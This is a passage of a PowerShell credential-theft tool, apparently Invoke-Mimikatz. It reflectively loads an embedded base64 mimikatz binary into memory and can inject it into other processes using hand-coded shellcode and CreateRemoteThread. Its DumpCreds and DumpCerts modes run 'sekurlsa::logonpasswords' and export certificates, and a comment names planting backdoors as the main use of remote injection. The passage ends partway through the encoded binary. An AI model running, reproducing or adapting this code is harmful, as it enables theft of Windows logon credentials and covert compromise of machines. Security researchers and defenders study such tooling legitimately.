		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
				        $Win32Functions.LocalFree.Invoke($OutputPtr);
				    }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	

	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
	{
		$ExeArgs = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ExeArgs = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)

	
    $PEBytes64 = "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